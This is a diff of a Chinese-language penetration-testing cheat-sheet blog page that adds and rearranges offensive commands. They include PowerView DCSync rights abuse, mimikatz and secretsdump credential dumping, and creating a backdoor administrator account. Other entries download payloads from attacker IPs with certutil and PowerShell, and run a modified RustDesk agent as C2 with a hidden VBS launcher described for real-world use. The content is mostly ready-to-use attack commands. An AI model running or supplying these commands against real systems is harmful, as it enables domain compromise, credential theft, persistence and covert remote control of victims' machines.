 </span></span><span style="display:flex;"><span><span style="color:#75715e">#写入目标msDS-AllowedToActOnBehalfOfOtherIdentity属性,$target替换为实际目标hostname</span>
 </span></span><span style="display:flex;"><span>Get-DomainComputer $target -Credential $Cred | Set-DomainObject -Set @{<span style="color:#e6db74">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span>=$SDBytes} -Credential $Cred
 </span></span></code></pre></div><p>后面就是正常的rbcd打法了</p>
-<h5 id="为目标添加dcsync权限">为目标添加dcsync权限
-</h5><p>所需用户无所谓，只要是有用户密码就行，我们是将一个用户直接写入了对域管的dcsync权限</p>
+<h5 id="目标为域">目标为域
+</h5><p>当我们对域有dacl写入权限，我们将允许对任意用户写入对域dcsync的权限</p>
 <p>本地powerview</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$username = <span style="color:#e6db74">&#34;$&lt;只要域名不要后缀的domain，例如baidu.com就只填baidu&gt;\</span>$user<span style="color:#e6db74">&#34;</span>; $password = <span style="color:#e6db74">&#34;</span>$pass<span style="color:#e6db74">&#34;</span>; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity <span style="color:#e6db74">&#39;$user&#39;</span> -TargetIdentity <span style="color:#e6db74">&#39;$domain\Domain Admins&#39;</span> -Rights DCSync
 </span></span></code></pre></div><p>远程bloodyad</p>
@@ -3321,8 +3384,34 @@ targetedKerberoast.py</p>
 </span></span><span style="display:flex;"><span>运行后将exe载荷比如说msf之类的给它，并且选择运行时要求提升权限，生成完毕后安装即可
 </span></span><span style="display:flex;"><span>msiexec /q /i RunProcessHacker.msi
 </span></span><span style="display:flex;"><span>开头的文章写的比较清楚，此笔记只供速用
-</span></span></code></pre></div><h2 id="msf相关">msf相关
-</h2><h3 id="文件系统操作">文件系统操作
+</span></span></code></pre></div><h2 id="linux相关-2">linux相关
+</h2><h3 id="提权三件套">提权三件套
+</h3><p>sudo</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>sudo -l
+</span></span></code></pre></div><p>suid</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>find / -perm -4000 2&gt;/dev/null
+</span></span></code></pre></div><p>pspy以及linpeas直接运行</p>
+<h3 id="py交互shell">py交互shell
+</h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span></code></pre></div><h3 id="抓包">抓包
+</h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>最好移动到tmp目录下抓取，有可能会遇到root权限不足
+</span></span><span style="display:flex;"><span>开启任务
+</span></span><span style="display:flex;"><span>tcpdump -i eth0 -w .d.pcap -s <span style="color:#ae81ff">0</span> <span style="color:#e6db74">&#39;not tcp port 22&#39;</span> &amp;
+</span></span><span style="display:flex;"><span>实时查看文件大小，差不多了就可以杀掉传本地wireshark分析
+</span></span><span style="display:flex;"><span>jobs
+</span></span><span style="display:flex;"><span>kill %$id
+</span></span></code></pre></div><h1 id="c2使用相关">c2使用相关
+</h1><h2 id="msf相关">msf相关
+</h2><h3 id="迅速部署msfubt">迅速部署msf（ubt）
+</h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall <span style="color:#f92672">&amp;&amp;</span> <span style="color:#ae81ff">\c</span>hmod <span style="color:#ae81ff">755</span> msfinstall <span style="color:#f92672">&amp;&amp;</span> <span style="color:#ae81ff">\.</span>/msfinstall
+</span></span><span style="display:flex;"><span>msf使用的是postgresql数据库,如果没有的话需要先安装
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sudo apt install postgresql
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>安装完成之后确认下服务是否开启，如果没有开启它
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sudo service postgresql status
+</span></span></code></pre></div><h3 id="文件系统操作">文件系统操作
 </h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>ls, cd, pwd	     浏览目标文件系统
 </span></span><span style="display:flex;"><span>download &lt;文件&gt;	    下载文件
 </span></span><span style="display:flex;"><span>upload &lt;文件&gt;	    上传文件
@@ -3433,22 +3522,21 @@ targetedKerberoast.py</p>
 </span></span><span style="display:flex;"><span>rename -name shell <span style="color:#75715e">#将当前会话重命名为shell</span>
 </span></span><span style="display:flex;"><span>execute-shellcode -p <span style="color:#f92672">[</span>pid<span style="color:#f92672">]</span> /home/wackymaker/test/1.bin <span style="color:#75715e">#执行shellcode，-p可以指定其他进程注入可以利用ps查看，用来上线msf很方便</span>
 </span></span><span style="display:flex;"><span>migrate -p <span style="color:#f92672">[</span>pid<span style="color:#f92672">]</span> <span style="color:#75715e">#指定载荷</span>
-</span></span></code></pre></div><h2 id="linux相关-2">linux相关
-</h2><h3 id="提权三件套">提权三件套
-</h3><p>sudo</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>sudo -l
-</span></span></code></pre></div><p>suid</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>find / -perm -4000 2&gt;/dev/null
-</span></span></code></pre></div><p>pspy以及linpeas直接运行</p>
-<h3 id="py交互shell">py交互shell
-</h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
-</span></span></code></pre></div><h3 id="抓包">抓包
-</h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>最好移动到tmp目录下抓取，有可能会遇到root权限不足
-</span></span><span style="display:flex;"><span>开启任务
-</span></span><span style="display:flex;"><span>tcpdump -i eth0 -w .d.pcap -s <span style="color:#ae81ff">0</span> <span style="color:#e6db74">&#39;not tcp port 22&#39;</span> &amp;
-</span></span><span style="display:flex;"><span>实时查看文件大小，差不多了就可以杀掉传本地wireshark分析
-</span></span><span style="display:flex;"><span>jobs
-</span></span><span style="display:flex;"><span>kill %$id
+</span></span></code></pre></div><h2 id="二开rustdesk使用">二开rustdesk使用
+</h2><p>下载地址</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>https://github.com/YDHCUI/rustdesk
+</span></span></code></pre></div><p>服务端建立在vps上（也可以是在内网机，主要是连接工具需要能访问到服务端，服务端不需要出网）</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>./server -i $vps_ip
+</span></span></code></pre></div><p>客户端运行</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>.<span style="color:#ae81ff">\a</span>gent.exe -s $vps_ip -u wack -p pass
+</span></span></code></pre></div><p>在官网下载rustdesk连接工具，就可以连接了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>将网络的id服务器与中继服务器改为vps，端口分别默认为：21116与21117
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 注意必须等rustdesk出现回显再连接否则可能报无法连接中继服务器报错</span>
+</span></span></code></pre></div><p>默认执行agent会启用黑窗口，靶机环境无所谓，但是实战环境最好使用隐藏脚本</p>
+<p>start.bat</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>agent.exe -s $ip -u admin -p pass
+</span></span></code></pre></div><p>loader.vbs</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>set ws<span style="color:#f92672">=</span>WScript.CreateObject<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;WScript.Shell&#34;</span><span style="color:#f92672">)</span>ws.Run <span style="color:#e6db74">&#34;start.bat&#34;</span>,0
 </span></span></code></pre></div><h1 id="后渗透利用">后渗透利用
 </h1><h2 id="defender相关">defender相关
 </h2><h3 id="添加排除目录">添加排除目录
@@ -3474,6 +3562,9 @@ targetedKerberoast.py</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>Add-ADGroupMember -Identity <span style="color:#e6db74">&#34;Domain Admins&#34;</span> -Members <span style="color:#e6db74">&#34;wackyamker&#34;</span>
 </span></span></code></pre></div><p>添加进入远程管理组</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>Add-ADGroupMember -Identity <span style="color:#e6db74">&#34;Remote Desktop Users&#34;</span> -Members  <span style="color:#e6db74">&#34;wackymaker&#34;</span>
+</span></span></code></pre></div><h3 id="后门本地管理创建需要本机管理员权限及以上">后门本地管理创建（需要本机管理员权限及以上）
+</h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>net user wackymaker wackMaker1! /add
+</span></span><span style="display:flex;"><span>net localgroup administrators wackymaker /add
 </span></span></code></pre></div><h3 id="后门无预认证账户创建需域管理或者目标写入权限">后门无预认证账户创建（需域管理或者目标写入权限）
 </h3><p>可以创建一个用户或着直接使用用户</p>
 <p>powershell</p>
@@ -3550,7 +3641,8 @@ targetedKerberoast.py</p>
 </span></span></code></pre></div><p>也可以全部抓取</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>mimikatz.exe <span style="color:#e6db74">&#34;lsadump::dcsync /domain:</span>$domain<span style="color:#e6db74"> /all /csv&#34;</span> <span style="color:#e6db74">&#34;exit&#34;</span>
 </span></span></code></pre></div><h3 id="impacket-1">impacket
-</h3><p>hash</p>
+</h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>显示有问题就只抓dc试试，加上参数-just-dc-ntlm
+</span></span></code></pre></div><p>hash</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-secretsdump $domain/$user@$ip -hashes $hash -target-ip $ip
 </span></span></code></pre></div><p>密码</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-secretsdump $domain/$user:$pass@$ip -target-ip $ip
@@ -3890,11 +3982,13 @@ linux换行</p>
 </span></span></code></pre></div><h3 id="windows上传文件">windows上传文件
 </h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>cmd
 </span></span><span style="display:flex;"><span>certutil -urlcache -split <span style="color:#f92672">-f</span> http<span style="color:#960050;background-color:#1e0010">:</span>//你的IP/文件路径 保存路径
-</span></span><span style="display:flex;"><span>certutil -urlcache -split <span style="color:#f92672">-f</span> http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">192.168</span>.174.<span style="color:#ae81ff">3</span>/<span style="color:#ae81ff">1</span>.exe C:\windows\tasks\<span style="color:#ae81ff">1</span>.exe
+</span></span><span style="display:flex;"><span>certutil -urlcache -split <span style="color:#f92672">-f</span> http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">172.22</span>.60.<span style="color:#ae81ff">52</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">4488</span>/<span style="color:#ae81ff">4433</span>.exe C:\windows\tasks\win443.exe
 </span></span><span style="display:flex;"><span>powershell
-</span></span><span style="display:flex;"><span>Invoke-WebRequest -Uri http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.16.<span style="color:#ae81ff">23</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">4444</span>/shell.exe -OutFile <span style="color:#e6db74">&#34;C:\users\sqlsvc\Documents\shell.exe&#34;</span>
+</span></span><span style="display:flex;"><span>Invoke-WebRequest -Uri http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">172.22</span>.3.<span style="color:#ae81ff">12</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">8888</span>/win443.exe -OutFile <span style="color:#e6db74">&#34;C:\windows\tasks\win443.exe&#34;</span>
 </span></span><span style="display:flex;"><span>或者
 </span></span><span style="display:flex;"><span>(New-Object System.Net.WebClient).DownloadFile(<span style="color:#e6db74">&#39;http://10.10.16.23:4444/shell.exe&#39;</span>, <span style="color:#e6db74">&#39;C:\users\sqlsvc\Documents\shell.exe&#39;</span>)
+</span></span><span style="display:flex;"><span>或者
+</span></span><span style="display:flex;"><span>powershell -c <span style="color:#e6db74">&#34;iwr http://172.22.60.52:4488/4433.exe -OutFile </span>$env:TEMP<span style="color:#e6db74">\win443.exe&#34;</span>
 </span></span></code></pre></div><h3 id="通用反向上传脚本uploadspy">通用反向上传脚本（uploads.py）
 </h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#curl -F &#34;file=@/home/app/app/instance/users.db&#34; http://10.10.16.6/</span>
@@ -4240,7 +4334,7 @@ linux换行</p>
     <section class="copyright">
         &copy; 
         
-        2025 wackymaker
+        2026 wackymaker
     </section>
     
     <section class="powerby">
@@ -4334,7 +4428,7 @@ linux换行</p>
                 src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                 
                 >
-            </script><script type="text/javascript" src="/ts/main.9feb0937132291db314540e31350de0da717928ca87e53cdebf73f0dfcdc569c.js" defer></script>
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
 <script>
     (function () {
         const customFont = document.createElement('link');
